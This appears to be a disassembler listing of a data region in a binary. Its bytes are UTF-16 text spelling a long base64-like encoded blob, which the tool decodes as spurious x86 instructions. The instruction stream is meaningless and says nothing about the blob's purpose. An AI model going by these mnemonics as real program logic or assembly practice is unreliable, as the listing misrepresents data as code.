  40a1c5:	6b 00 2f             	imul   $0x2f,(%eax),%eax
  40a1c8:	00 61 00             	add    %ah,0x0(%ecx)
  40a1cb:	36 00 44 00 55       	add    %al,%ss:0x55(%eax,%eax,1)
  40a1d0:	00 7a 00             	add    %bh,0x0(%edx)
  40a1d3:	59                   	pop    %ecx
  40a1d4:	00 41 00             	add    %al,0x0(%ecx)
  40a1d7:	70 00                	jo     0x40a1d9
  40a1d9:	57                   	push   %edi
  40a1da:	00 55 00             	add    %dl,0x0(%ebp)
  40a1dd:	35 00 54 00 2b       	xor    $0x2b005400,%eax
  40a1e2:	00 43 00             	add    %al,0x0(%ebx)
  40a1e5:	47                   	inc    %edi
  40a1e6:	00 33                	add    %dh,(%ebx)
  40a1e8:	00 6a 00             	add    %ch,0x0(%edx)
  40a1eb:	38 00                	cmp    %al,(%eax)
  40a1ed:	64 00 76 00          	add    %dh,%fs:0x0(%esi)
  40a1f1:	5a                   	pop    %edx
  40a1f2:	00 46 00             	add    %al,0x0(%esi)
  40a1f5:	4c                   	dec    %esp
  40a1f6:	00 49 00             	add    %cl,0x0(%ecx)
  40a1f9:	76 00                	jbe    0x40a1fb
  40a1fb:	75 00                	jne    0x40a1fd
  40a1fd:	49                   	dec    %ecx
  40a1fe:	00 68 00             	add    %ch,0x0(%eax)
  40a201:	52                   	push   %edx
  40a202:	00 67 00             	add    %ah,0x0(%edi)
  40a205:	36 00 59 00          	add    %bl,%ss:0x0(%ecx)
  40a209:	77 00                	ja     0x40a20b
  40a20b:	30 00                	xor    %al,(%eax)
  40a20d:	5a                   	pop    %edx
  40a20e:	00 70 00             	add    %dh,0x0(%eax)
  40a211:	46                   	inc    %esi
  40a212:	00 39                	add    %bh,(%ecx)
  40a214:	00 53 00             	add    %dl,0x0(%ebx)
  40a217:	68 00 35 00 69       	push   $0x69003500
  40a21c:	00 36                	add    %dh,(%esi)
  40a21e:	00 4a 00             	add    %cl,0x0(%edx)
  40a221:	6a 00                	push   $0x0
  40a223:	7a 00                	jp     0x40a225
  40a225:	31 00                	xor    %eax,(%eax)
  40a227:	6d                   	insl   (%dx),%es:(%edi)
  40a228:	00 54 00 52          	add    %dl,0x52(%eax,%eax,1)
  40a22c:	00 54 00 55          	add    %dl,0x55(%eax,%eax,1)
  40a230:	00 42 00             	add    %al,0x0(%edx)
  40a233:	71 00                	jno    0x40a235
  40a235:	56                   	push   %esi
  40a236:	00 32                	add    %dh,(%edx)
  40a238:	00 6a 00             	add    %ch,0x0(%edx)
  40a23b:	48                   	dec    %eax
  40a23c:	00 79 00             	add    %bh,0x0(%ecx)
  40a23f:	6d                   	insl   (%dx),%es:(%edi)
  40a240:	00 61 00             	add    %ah,0x0(%ecx)
  40a243:	67 00 77 00          	add    %dh,0x0(%bx)
  40a247:	52                   	push   %edx
  40a248:	00 38                	add    %bh,(%eax)
  40a24a:	00 37                	add    %dh,(%edi)
  40a24c:	00 46 00             	add    %al,0x0(%esi)
  40a24f:	77 00                	ja     0x40a251
  40a251:	39 00                	cmp    %eax,(%eax)
  40a253:	4f                   	dec    %edi
  40a254:	00 50 00             	add    %dl,0x0(%eax)
  40a257:	5a                   	pop    %edx
  40a258:	00 66 00             	add    %ah,0x0(%esi)
  40a25b:	36 00 53 00          	add    %dl,%ss:0x0(%ebx)
  40a25f:	62 00                	bound  %eax,(%eax)
  40a261:	66 00 30             	data16 add %dh,(%eax)
  40a264:	00 41 00             	add    %al,0x0(%ecx)
  40a267:	63 00                	arpl   %eax,(%eax)
  40a269:	6a 00                	push   $0x0
  40a26b:	6c                   	insb   (%dx),%es:(%edi)
  40a26c:	00 74 00 4a          	add    %dh,0x4a(%eax,%eax,1)
  40a270:	00 62 00             	add    %ah,0x0(%edx)
  40a273:	35 00 44 00 45       	xor    $0x45004400,%eax
  40a278:	00 32                	add    %dh,(%edx)
  40a27a:	00 6b 00             	add    %ch,0x0(%ebx)
  40a27d:	36 00 79 00          	add    %bh,%ss:0x0(%ecx)
  40a281:	30 00                	xor    %al,(%eax)
  40a283:	61                   	popa
  40a284:	00 33                	add    %dh,(%ebx)
  40a286:	00 74 00 63          	add    %dh,0x63(%eax,%eax,1)
  40a28a:	00 44 00 58          	add    %al,0x58(%eax,%eax,1)
  40a28e:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a291:	7a 00                	jp     0x40a293
  40a293:	65 00 77 00          	add    %dh,%gs:0x0(%edi)
  40a297:	5a                   	pop    %edx
  40a298:	00 65 00             	add    %ah,0x0(%ebp)
  40a29b:	34 00                	xor    $0x0,%al
  40a29d:	63 00                	arpl   %eax,(%eax)
  40a29f:	4b                   	dec    %ebx
  40a2a0:	00 70 00             	add    %dh,0x0(%eax)
  40a2a3:	52                   	push   %edx
  40a2a4:	00 4d 00             	add    %cl,0x0(%ebp)
  40a2a7:	59                   	pop    %ecx
  40a2a8:	00 47 00             	add    %al,0x0(%edi)
  40a2ab:	74 00                	je     0x40a2ad
  40a2ad:	75 00                	jne    0x40a2af
  40a2af:	65 00 51 00          	add    %dl,%gs:0x0(%ecx)
  40a2b3:	35 00 4f 00 38       	xor    $0x38004f00,%eax
  40a2b8:	00 70 00             	add    %dh,0x0(%eax)
  40a2bb:	34 00                	xor    $0x0,%al
  40a2bd:	55                   	push   %ebp
  40a2be:	00 58 00             	add    %bl,0x0(%eax)
  40a2c1:	46                   	inc    %esi
  40a2c2:	00 33                	add    %dh,(%ebx)
  40a2c4:	00 62 00             	add    %ah,0x0(%edx)
  40a2c7:	42                   	inc    %edx
  40a2c8:	00 31                	add    %dh,(%ecx)
  40a2ca:	00 78 00             	add    %bh,0x0(%eax)
  40a2cd:	48                   	dec    %eax
  40a2ce:	00 32                	add    %dh,(%edx)
  40a2d0:	00 63 00             	add    %ah,0x0(%ebx)
  40a2d3:	65 00 38             	add    %bh,%gs:(%eax)
  40a2d6:	00 78 00             	add    %bh,0x0(%eax)
  40a2d9:	2f                   	das
  40a2da:	00 4e 00             	add    %cl,0x0(%esi)
  40a2dd:	41                   	inc    %ecx
  40a2de:	00 6f 00             	add    %ch,0x0(%edi)
  40a2e1:	6d                   	insl   (%dx),%es:(%edi)
  40a2e2:	00 53 00             	add    %dl,0x0(%ebx)
  40a2e5:	61                   	popa
  40a2e6:	00 48 00             	add    %cl,0x0(%eax)
  40a2e9:	61                   	popa
  40a2ea:	00 4a 00             	add    %cl,0x0(%edx)
  40a2ed:	4f                   	dec    %edi
  40a2ee:	00 62 00             	add    %ah,0x0(%edx)
  40a2f1:	72 00                	jb     0x40a2f3
  40a2f3:	56                   	push   %esi
  40a2f4:	00 6a 00             	add    %ch,0x0(%edx)
  40a2f7:	35 00 4c 00 6f       	xor    $0x6f004c00,%eax
  40a2fc:	00 72 00             	add    %dh,0x0(%edx)
  40a2ff:	75 00                	jne    0x40a301
  40a301:	77 00                	ja     0x40a303
  40a303:	66 00 44 00 44       	data16 add %al,0x44(%eax,%eax,1)
  40a308:	00 78 00             	add    %bh,0x0(%eax)
  40a30b:	2b 00                	sub    (%eax),%eax
  40a30d:	49                   	dec    %ecx
  40a30e:	00 45 00             	add    %al,0x0(%ebp)
  40a311:	2b 00                	sub    (%eax),%eax
  40a313:	65 00 76 00          	add    %dh,%gs:0x0(%esi)
  40a317:	2b 00                	sub    (%eax),%eax
  40a319:	59                   	pop    %ecx
  40a31a:	00 6f 00             	add    %ch,0x0(%edi)
  40a31d:	57                   	push   %edi
  40a31e:	00 4b 00             	add    %cl,0x0(%ebx)
  40a321:	56                   	push   %esi
  40a322:	00 32                	add    %dh,(%edx)
  40a324:	00 63 00             	add    %ah,0x0(%ebx)
  40a327:	45                   	inc    %ebp
  40a328:	00 32                	add    %dh,(%edx)
  40a32a:	00 4b 00             	add    %cl,0x0(%ebx)
  40a32d:	5a                   	pop    %edx
  40a32e:	00 4a 00             	add    %cl,0x0(%edx)
  40a331:	2f                   	das
  40a332:	00 73 00             	add    %dh,0x0(%ebx)
  40a335:	50                   	push   %eax
  40a336:	00 66 00             	add    %ah,0x0(%esi)
  40a339:	42                   	inc    %edx
  40a33a:	00 62 00             	add    %ah,0x0(%edx)
  40a33d:	36 00 38             	add    %bh,%ss:(%eax)
  40a340:	00 72 00             	add    %dh,0x0(%edx)
  40a343:	4c                   	dec    %esp
  40a344:	00 39                	add    %bh,(%ecx)
  40a346:	00 48 00             	add    %cl,0x0(%eax)
  40a349:	44                   	inc    %esp
  40a34a:	00 36                	add    %dh,(%esi)
  40a34c:	00 46 00             	add    %al,0x0(%esi)
  40a34f:	65 00 2b             	add    %ch,%gs:(%ebx)
  40a352:	00 59 00             	add    %bl,0x0(%ecx)
  40a355:	45                   	inc    %ebp
  40a356:	00 6a 00             	add    %ch,0x0(%edx)
  40a359:	47                   	inc    %edi
  40a35a:	00 4a 00             	add    %cl,0x0(%edx)
  40a35d:	78 00                	js     0x40a35f
  40a35f:	6b 00 59             	imul   $0x59,(%eax),%eax
  40a362:	00 4d 00             	add    %cl,0x0(%ebp)
  40a365:	2b 00                	sub    (%eax),%eax
  40a367:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  40a36b:	34 00                	xor    $0x0,%al
  40a36d:	43                   	inc    %ebx
  40a36e:	00 67 00             	add    %ah,0x0(%edi)
  40a371:	41                   	inc    %ecx
  40a372:	00 7a 00             	add    %bh,0x0(%edx)
  40a375:	31 00                	xor    %eax,(%eax)
  40a377:	36 00 7a 00          	add    %bh,%ss:0x0(%edx)
  40a37b:	32 00                	xor    (%eax),%al
  40a37d:	47                   	inc    %edi
  40a37e:	00 68 00             	add    %ch,0x0(%eax)
  40a381:	7a 00                	jp     0x40a383
  40a383:	78 00                	js     0x40a385
  40a385:	56                   	push   %esi
  40a386:	00 51 00             	add    %dl,0x0(%ecx)
  40a389:	4d                   	dec    %ebp
  40a38a:	00 6d 00             	add    %ch,0x0(%ebp)
  40a38d:	58                   	pop    %eax
  40a38e:	00 47 00             	add    %al,0x0(%edi)
  40a391:	73 00                	jae    0x40a393
  40a393:	74 00                	je     0x40a395
  40a395:	73 00                	jae    0x40a397
  40a397:	61                   	popa
  40a398:	00 6a 00             	add    %ch,0x0(%edx)
  40a39b:	72 00                	jb     0x40a39d
  40a39d:	30 00                	xor    %al,(%eax)
  40a39f:	46                   	inc    %esi
  40a3a0:	00 47 00             	add    %al,0x0(%edi)
  40a3a3:	6c                   	insb   (%dx),%es:(%edi)
  40a3a4:	00 6d 00             	add    %ch,0x0(%ebp)
  40a3a7:	58                   	pop    %eax
  40a3a8:	00 69 00             	add    %ch,0x0(%ecx)
  40a3ab:	65 00 53 00          	add    %dl,%gs:0x0(%ebx)
  40a3af:	56                   	push   %esi
  40a3b0:	00 52 00             	add    %dl,0x0(%edx)
  40a3b3:	34 00                	xor    $0x0,%al
  40a3b5:	49                   	dec    %ecx
  40a3b6:	00 53 00             	add    %dl,0x0(%ebx)
  40a3b9:	63 00                	arpl   %eax,(%eax)
  40a3bb:	30 00                	xor    %al,(%eax)
  40a3bd:	47                   	inc    %edi
  40a3be:	00 54 00 2f          	add    %dl,0x2f(%eax,%eax,1)
  40a3c2:	00 4d 00             	add    %cl,0x0(%ebp)
  40a3c5:	69 00 57 00 44 00    	imul   $0x440057,(%eax),%eax
  40a3cb:	59                   	pop    %ecx
  40a3cc:	00 49 00             	add    %cl,0x0(%ecx)
  40a3cf:	62 00                	bound  %eax,(%eax)
  40a3d1:	34 00                	xor    $0x0,%al
  40a3d3:	78 00                	js     0x40a3d5
  40a3d5:	2f                   	das
  40a3d6:	00 54 00 56          	add    %dl,0x56(%eax,%eax,1)
  40a3da:	00 2b                	add    %ch,(%ebx)
  40a3dc:	00 42 00             	add    %al,0x0(%edx)
  40a3df:	46                   	inc    %esi
  40a3e0:	00 4c 00 50          	add    %cl,0x50(%eax,%eax,1)
  40a3e4:	00 48 00             	add    %cl,0x0(%eax)
  40a3e7:	70 00                	jo     0x40a3e9
  40a3e9:	62 00                	bound  %eax,(%eax)
  40a3eb:	4f                   	dec    %edi
  40a3ec:	00 30                	add    %dh,(%eax)
  40a3ee:	00 2b                	add    %ch,(%ebx)
  40a3f0:	00 6a 00             	add    %ch,0x0(%edx)
  40a3f3:	49                   	dec    %ecx
  40a3f4:	00 58 00             	add    %bl,0x0(%eax)
  40a3f7:	77 00                	ja     0x40a3f9
  40a3f9:	4b                   	dec    %ebx
  40a3fa:	00 43 00             	add    %al,0x0(%ebx)
  40a3fd:	67 00 5a 00          	add    %bl,0x0(%bp,%si)
  40a401:	6f                   	outsl  %ds:(%esi),(%dx)
  40a402:	00 52 00             	add    %dl,0x0(%edx)
  40a405:	62 00                	bound  %eax,(%eax)
  40a407:	70 00                	jo     0x40a409
  40a409:	57                   	push   %edi
  40a40a:	00 52 00             	add    %dl,0x0(%edx)
  40a40d:	42                   	inc    %edx
  40a40e:	00 6b 00             	add    %ch,0x0(%ebx)
  40a411:	4a                   	dec    %edx
  40a412:	00 74 00 54          	add    %dh,0x54(%eax,%eax,1)
  40a416:	00 33                	add    %dh,(%ebx)
  40a418:	00 45 00             	add    %al,0x0(%ebp)
  40a41b:	6a 00                	push   $0x0
  40a41d:	77 00                	ja     0x40a41f
  40a41f:	6b 00 42             	imul   $0x42,(%eax),%eax
  40a422:	00 45 00             	add    %al,0x0(%ebp)
  40a425:	39 00                	cmp    %eax,(%eax)
  40a427:	70 00                	jo     0x40a429
  40a429:	49                   	dec    %ecx
  40a42a:	00 6f 00             	add    %ch,0x0(%edi)
  40a42d:	65 00 31             	add    %dh,%gs:(%ecx)
  40a430:	00 79 00             	add    %bh,0x0(%ecx)
  40a433:	64 00 4a 00          	add    %cl,%fs:0x0(%edx)
  40a437:	69 00 53 00 54 00    	imul   $0x540053,(%eax),%eax
  40a43d:	64 00 51 00          	add    %dl,%fs:0x0(%ecx)
  40a441:	43                   	inc    %ebx
  40a442:	00 63 00             	add    %ah,0x0(%ebx)
  40a445:	77 00                	ja     0x40a447
  40a447:	79 00                	jns    0x40a449
  40a449:	64 00 79 00          	add    %bh,%fs:0x0(%ecx)
  40a44d:	35 00 4b 00 78       	xor    $0x78004b00,%eax
  40a452:	00 73 00             	add    %dh,0x0(%ebx)
  40a455:	2b 00                	sub    (%eax),%eax
  40a457:	78 00                	js     0x40a459
  40a459:	78 00                	js     0x40a45b
  40a45b:	6f                   	outsl  %ds:(%esi),(%dx)
  40a45c:	00 77 00             	add    %dh,0x0(%edi)
  40a45f:	57                   	push   %edi
  40a460:	00 65 00             	add    %ah,0x0(%ebp)
  40a463:	75 00                	jne    0x40a465
  40a465:	66 00 32             	data16 add %dh,(%edx)
  40a468:	00 70 00             	add    %dh,0x0(%eax)
  40a46b:	4c                   	dec    %esp
  40a46c:	00 45 00             	add    %al,0x0(%ebp)
  40a46f:	7a 00                	jp     0x40a471
  40a471:	44                   	inc    %esp
  40a472:	00 2b                	add    %ch,(%ebx)
  40a474:	00 65 00             	add    %ah,0x0(%ebp)
  40a477:	51                   	push   %ecx
  40a478:	00 37                	add    %dh,(%edi)
  40a47a:	00 30                	add    %dh,(%eax)
  40a47c:	00 50 00             	add    %dl,0x0(%eax)
  40a47f:	4c                   	dec    %esp
  40a480:	00 35 00 58 00 73    	add    %dh,0x73005800
  40a486:	00 53 00             	add    %dl,0x0(%ebx)
  40a489:	74 00                	je     0x40a48b
  40a48b:	72 00                	jb     0x40a48d
  40a48d:	49                   	dec    %ecx
  40a48e:	00 73 00             	add    %dh,0x0(%ebx)
  40a491:	39 00                	cmp    %eax,(%eax)
  40a493:	42                   	inc    %edx
  40a494:	00 41 00             	add    %al,0x0(%ecx)
  40a497:	4e                   	dec    %esi
  40a498:	00 76 00             	add    %dh,0x0(%esi)
  40a49b:	55                   	push   %ebp
  40a49c:	00 4d 00             	add    %cl,0x0(%ebp)
  40a49f:	31 00                	xor    %eax,(%eax)
  40a4a1:	4d                   	dec    %ebp
  40a4a2:	00 36                	add    %dh,(%esi)
  40a4a4:	00 52 00             	add    %dl,0x0(%edx)
  40a4a7:	64 00 51 00          	add    %dl,%fs:0x0(%ecx)
  40a4ab:	6a 00                	push   $0x0
  40a4ad:	46                   	inc    %esi
  40a4ae:	00 78 00             	add    %bh,0x0(%eax)
  40a4b1:	58                   	pop    %eax
  40a4b2:	00 73 00             	add    %dh,0x0(%ebx)
  40a4b5:	6e                   	outsb  %ds:(%esi),(%dx)
  40a4b6:	00 47 00             	add    %al,0x0(%edi)
  40a4b9:	43                   	inc    %ebx
  40a4ba:	00 46 00             	add    %al,0x0(%esi)
  40a4bd:	6c                   	insb   (%dx),%es:(%edi)
  40a4be:	00 48 00             	add    %cl,0x0(%eax)
  40a4c1:	65 00 32             	add    %dh,%gs:(%edx)
  40a4c4:	00 59 00             	add    %bl,0x0(%ecx)
  40a4c7:	54                   	push   %esp
  40a4c8:	00 58 00             	add    %bl,0x0(%eax)
  40a4cb:	6c                   	insb   (%dx),%es:(%edi)
  40a4cc:	00 50 00             	add    %dl,0x0(%eax)
  40a4cf:	57                   	push   %edi
  40a4d0:	00 57 00             	add    %dl,0x0(%edi)
  40a4d3:	73 00                	jae    0x40a4d5
  40a4d5:	41                   	inc    %ecx
  40a4d6:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a4d9:	43                   	inc    %ebx
  40a4da:	00 78 00             	add    %bh,0x0(%eax)
  40a4dd:	6c                   	insb   (%dx),%es:(%edi)
  40a4de:	00 43 00             	add    %al,0x0(%ebx)
  40a4e1:	6e                   	outsb  %ds:(%esi),(%dx)
  40a4e2:	00 2f                	add    %ch,(%edi)
  40a4e4:	00 77 00             	add    %dh,0x0(%edi)
  40a4e7:	59                   	pop    %ecx
  40a4e8:	00 46 00             	add    %al,0x0(%esi)
  40a4eb:	47                   	inc    %edi
  40a4ec:	00 50 00             	add    %dl,0x0(%eax)
  40a4ef:	43                   	inc    %ebx
  40a4f0:	00 54 00 4b          	add    %dl,0x4b(%eax,%eax,1)
  40a4f4:	00 35 00 65 00 4c    	add    %dh,0x4c006500
  40a4fa:	00 53 00             	add    %dl,0x0(%ebx)
  40a4fd:	65 00 35 00 37 00 4a 	add    %dh,%gs:0x4a003700
  40a504:	00 38                	add    %bh,(%eax)
  40a506:	00 37                	add    %dh,(%edi)
  40a508:	00 6d 00             	add    %ch,0x0(%ebp)
  40a50b:	39 00                	cmp    %eax,(%eax)
  40a50d:	67 00 61 00          	add    %ah,0x0(%bx,%di)
  40a511:	58                   	pop    %eax
  40a512:	00 2b                	add    %ch,(%ebx)
  40a514:	00 52 00             	add    %dl,0x0(%edx)
  40a517:	77 00                	ja     0x40a519
  40a519:	72 00                	jb     0x40a51b
  40a51b:	72 00                	jb     0x40a51d
  40a51d:	70 00                	jo     0x40a51f
  40a51f:	79 00                	jns    0x40a521
  40a521:	44                   	inc    %esp
  40a522:	00 61 00             	add    %ah,0x0(%ecx)
  40a525:	4e                   	dec    %esi
  40a526:	00 70 00             	add    %dh,0x0(%eax)
  40a529:	66 00 76 00          	data16 add %dh,0x0(%esi)
  40a52d:	33 00                	xor    (%eax),%eax
  40a52f:	54                   	push   %esp
  40a530:	00 65 00             	add    %ah,0x0(%ebp)
  40a533:	6f                   	outsl  %ds:(%esi),(%dx)
  40a534:	00 77 00             	add    %dh,0x0(%edi)
  40a537:	32 00                	xor    (%eax),%al
  40a539:	4c                   	dec    %esp
  40a53a:	00 49 00             	add    %cl,0x0(%ecx)
  40a53d:	66 00 35 00 78 00 71 	data16 add %dh,0x71007800
  40a544:	00 61 00             	add    %ah,0x0(%ecx)
  40a547:	43                   	inc    %ebx
  40a548:	00 61 00             	add    %ah,0x0(%ecx)
  40a54b:	75 00                	jne    0x40a54d
  40a54d:	30 00                	xor    %al,(%eax)
  40a54f:	76 00                	jbe    0x40a551
  40a551:	2b 00                	sub    (%eax),%eax
  40a553:	6c                   	insb   (%dx),%es:(%edi)
  40a554:	00 6e 00             	add    %ch,0x0(%esi)
  40a557:	51                   	push   %ecx
  40a558:	00 32                	add    %dh,(%edx)
  40a55a:	00 39                	add    %bh,(%ecx)
  40a55c:	00 6b 00             	add    %ch,0x0(%ebx)
  40a55f:	72 00                	jb     0x40a561
  40a561:	6c                   	insb   (%dx),%es:(%edi)
  40a562:	00 4d 00             	add    %cl,0x0(%ebp)
  40a565:	48                   	dec    %eax
  40a566:	00 73 00             	add    %dh,0x0(%ebx)
  40a569:	41                   	inc    %ecx
  40a56a:	00 69 00             	add    %ch,0x0(%ecx)
  40a56d:	4c                   	dec    %esp
  40a56e:	00 6e 00             	add    %ch,0x0(%esi)
  40a571:	33 00                	xor    (%eax),%eax
  40a573:	7a 00                	jp     0x40a575
  40a575:	38 00                	cmp    %al,(%eax)
  40a577:	2f                   	das
  40a578:	00 33                	add    %dh,(%ebx)
  40a57a:	00 45 00             	add    %al,0x0(%ebp)
  40a57d:	43                   	inc    %ebx
  40a57e:	00 57 00             	add    %dl,0x0(%edi)
  40a581:	79 00                	jns    0x40a583
  40a583:	4d                   	dec    %ebp
  40a584:	00 4f 00             	add    %cl,0x0(%edi)
  40a587:	76 00                	jbe    0x40a589
  40a589:	4e                   	dec    %esi
  40a58a:	00 38                	add    %bh,(%eax)
  40a58c:	00 4d 00             	add    %cl,0x0(%ebp)
  40a58f:	39 00                	cmp    %eax,(%eax)
  40a591:	4b                   	dec    %ebx
  40a592:	00 65 00             	add    %ah,0x0(%ebp)
  40a595:	67 00 49 00          	add    %cl,0x0(%bx,%di)
  40a599:	30 00                	xor    %al,(%eax)
  40a59b:	76 00                	jbe    0x40a59d
  40a59d:	4a                   	dec    %edx
  40a59e:	00 78 00             	add    %bh,0x0(%eax)
  40a5a1:	76 00                	jbe    0x40a5a3
  40a5a3:	34 00                	xor    $0x0,%al
  40a5a5:	56                   	push   %esi
  40a5a6:	00 36                	add    %dh,(%esi)
  40a5a8:	00 41 00             	add    %al,0x0(%ecx)
  40a5ab:	54                   	push   %esp
  40a5ac:	00 6e 00             	add    %ch,0x0(%esi)
  40a5af:	39 00                	cmp    %eax,(%eax)
  40a5b1:	42                   	inc    %edx
  40a5b2:	00 36                	add    %dh,(%esi)
  40a5b4:	00 76 00             	add    %dh,0x0(%esi)
  40a5b7:	64 00 32             	add    %dh,%fs:(%edx)
  40a5ba:	00 54 00 44          	add    %dl,0x44(%eax,%eax,1)
  40a5be:	00 53 00             	add    %dl,0x0(%ebx)
  40a5c1:	78 00                	js     0x40a5c3
  40a5c3:	63 00                	arpl   %eax,(%eax)
  40a5c5:	32 00                	xor    (%eax),%al
  40a5c7:	6a 00                	push   $0x0
  40a5c9:	6e                   	outsb  %ds:(%esi),(%dx)
  40a5ca:	00 71 00             	add    %dh,0x0(%ecx)
  40a5cd:	78 00                	js     0x40a5cf
  40a5cf:	52                   	push   %edx
  40a5d0:	00 7a 00             	add    %bh,0x0(%edx)
  40a5d3:	64 00 67 00          	add    %ah,%fs:0x0(%edi)
  40a5d7:	6b 00 33             	imul   $0x33,(%eax),%eax
  40a5da:	00 57 00             	add    %dl,0x0(%edi)
  40a5dd:	4e                   	dec    %esi
  40a5de:	00 64 00 67          	add    %ah,0x67(%eax,%eax,1)
  40a5e2:	00 48 00             	add    %cl,0x0(%eax)
  40a5e5:	7a 00                	jp     0x40a5e7
  40a5e7:	56                   	push   %esi
  40a5e8:	00 33                	add    %dh,(%ebx)
  40a5ea:	00 6b 00             	add    %ch,0x0(%ebx)
  40a5ed:	4b                   	dec    %ebx
  40a5ee:	00 63 00             	add    %ah,0x0(%ebx)
  40a5f1:	44                   	inc    %esp
  40a5f2:	00 57 00             	add    %dl,0x0(%edi)
  40a5f5:	65 00 30             	add    %dh,%gs:(%eax)
  40a5f8:	00 59 00             	add    %bl,0x0(%ecx)
  40a5fb:	5a                   	pop    %edx
  40a5fc:	00 43 00             	add    %al,0x0(%ebx)
  40a5ff:	55                   	push   %ebp
  40a600:	00 30                	add    %dh,(%eax)
  40a602:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a605:	43                   	inc    %ebx
  40a606:	00 67 00             	add    %ah,0x0(%edi)
  40a609:	66 00 57 00          	data16 add %dl,0x0(%edi)
  40a60d:	78 00                	js     0x40a60f
  40a60f:	4b                   	dec    %ebx
  40a610:	00 4c 00 34          	add    %cl,0x34(%eax,%eax,1)
  40a614:	00 37                	add    %dh,(%edi)
  40a616:	00 6f 00             	add    %ch,0x0(%edi)
  40a619:	4e                   	dec    %esi
  40a61a:	00 6a 00             	add    %ch,0x0(%edx)
  40a61d:	67 00 41 00          	add    %al,0x0(%bx,%di)
  40a621:	4f                   	dec    %edi
  40a622:	00 70 00             	add    %dh,0x0(%eax)
  40a625:	53                   	push   %ebx
  40a626:	00 69 00             	add    %ch,0x0(%ecx)
  40a629:	41                   	inc    %ecx
  40a62a:	00 73 00             	add    %dh,0x0(%ebx)
  40a62d:	6c                   	insb   (%dx),%es:(%edi)
  40a62e:	00 36                	add    %dh,(%esi)
  40a630:	00 72 00             	add    %dh,0x0(%edx)
  40a633:	6a 00                	push   $0x0
  40a635:	56                   	push   %esi
  40a636:	00 54 00 45          	add    %dl,0x45(%eax,%eax,1)
  40a63a:	00 39                	add    %bh,(%ecx)
  40a63c:	00 4b 00             	add    %cl,0x0(%ebx)
  40a63f:	7a 00                	jp     0x40a641
  40a641:	69 00 39 00 7a 00    	imul   $0x7a0039,(%eax),%eax
  40a647:	55                   	push   %ebp
  40a648:	00 56 00             	add    %dl,0x0(%esi)
  40a64b:	31 00                	xor    %eax,(%eax)
  40a64d:	76 00                	jbe    0x40a64f
  40a64f:	74 00                	je     0x40a651
  40a651:	37                   	aaa
  40a652:	00 51 00             	add    %dl,0x0(%ecx)
  40a655:	61                   	popa
  40a656:	00 77 00             	add    %dh,0x0(%edi)
  40a659:	6a 00                	push   $0x0
  40a65b:	57                   	push   %edi
  40a65c:	00 55 00             	add    %dl,0x0(%ebp)
  40a65f:	52                   	push   %edx
  40a660:	00 71 00             	add    %dh,0x0(%ecx)
  40a663:	54                   	push   %esp
  40a664:	00 32                	add    %dh,(%edx)
  40a666:	00 52 00             	add    %dl,0x0(%edx)
  40a669:	41                   	inc    %ecx
  40a66a:	00 6a 00             	add    %ch,0x0(%edx)
  40a66d:	59                   	pop    %ecx
  40a66e:	00 47 00             	add    %al,0x0(%edi)
  40a671:	38 00                	cmp    %al,(%eax)
  40a673:	71 00                	jno    0x40a675
  40a675:	79 00                	jns    0x40a677
  40a677:	30 00                	xor    %al,(%eax)
  40a679:	47                   	inc    %edi
  40a67a:	00 4e 00             	add    %cl,0x0(%esi)
  40a67d:	56                   	push   %esi
  40a67e:	00 37                	add    %dh,(%edi)
  40a680:	00 56 00             	add    %dl,0x0(%esi)
  40a683:	42                   	inc    %edx
  40a684:	00 4e 00             	add    %cl,0x0(%esi)
  40a687:	35 00 4b 00 4f       	xor    $0x4f004b00,%eax
  40a68c:	00 56 00             	add    %dl,0x0(%esi)
  40a68f:	61                   	popa
  40a690:	00 50 00             	add    %dl,0x0(%eax)
  40a693:	34 00                	xor    $0x0,%al
  40a695:	53                   	push   %ebx
  40a696:	00 48 00             	add    %cl,0x0(%eax)
  40a699:	64 00 74 00 79       	add    %dh,%fs:0x79(%eax,%eax,1)
  40a69e:	00 52 00             	add    %dl,0x0(%edx)
  40a6a1:	55                   	push   %ebp
  40a6a2:	00 6f 00             	add    %ch,0x0(%edi)
  40a6a5:	31 00                	xor    %eax,(%eax)
  40a6a7:	6f                   	outsl  %ds:(%esi),(%dx)
  40a6a8:	00 56 00             	add    %dl,0x0(%esi)
  40a6ab:	61                   	popa
  40a6ac:	00 48 00             	add    %cl,0x0(%eax)
  40a6af:	74 00                	je     0x40a6b1
  40a6b1:	77 00                	ja     0x40a6b3
  40a6b3:	33 00                	xor    (%eax),%eax
  40a6b5:	50                   	push   %eax
  40a6b6:	00 56 00             	add    %dl,0x0(%esi)
  40a6b9:	32 00                	xor    (%eax),%al
  40a6bb:	6d                   	insl   (%dx),%es:(%edi)
  40a6bc:	00 39                	add    %bh,(%ecx)
  40a6be:	00 54 00 69          	add    %dl,0x69(%eax,%eax,1)
  40a6c2:	00 61 00             	add    %ah,0x0(%ecx)
  40a6c5:	79 00                	jns    0x40a6c7
  40a6c7:	6e                   	outsb  %ds:(%esi),(%dx)
  40a6c8:	00 41 00             	add    %al,0x0(%ecx)
  40a6cb:	38 00                	cmp    %al,(%eax)
  40a6cd:	77 00                	ja     0x40a6cf
  40a6cf:	38 00                	cmp    %al,(%eax)
  40a6d1:	35 00 57 00 59       	xor    $0x59005700,%eax
  40a6d6:	00 6b 00             	add    %ch,0x0(%ebx)
  40a6d9:	4e                   	dec    %esi
  40a6da:	00 37                	add    %dh,(%edi)
  40a6dc:	00 30                	add    %dh,(%eax)
  40a6de:	00 2f                	add    %ch,(%edi)
  40a6e0:	00 4d 00             	add    %cl,0x0(%ebp)
  40a6e3:	44                   	inc    %esp
  40a6e4:	00 49 00             	add    %cl,0x0(%ecx)
  40a6e7:	55                   	push   %ebp
  40a6e8:	00 55 00             	add    %dl,0x0(%ebp)
  40a6eb:	45                   	inc    %ebp
  40a6ec:	00 67 00             	add    %ah,0x0(%edi)
  40a6ef:	2b 00                	sub    (%eax),%eax
  40a6f1:	64 00 53 00          	add    %dl,%fs:0x0(%ebx)
  40a6f5:	4a                   	dec    %edx
  40a6f6:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a6f9:	63 00                	arpl   %eax,(%eax)
  40a6fb:	54                   	push   %esp
  40a6fc:	00 6b 00             	add    %ch,0x0(%ebx)
  40a6ff:	63 00                	arpl   %eax,(%eax)
  40a701:	45                   	inc    %ebp
  40a702:	00 31                	add    %dh,(%ecx)
  40a704:	00 39                	add    %bh,(%ecx)
  40a706:	00 2b                	add    %ch,(%ebx)
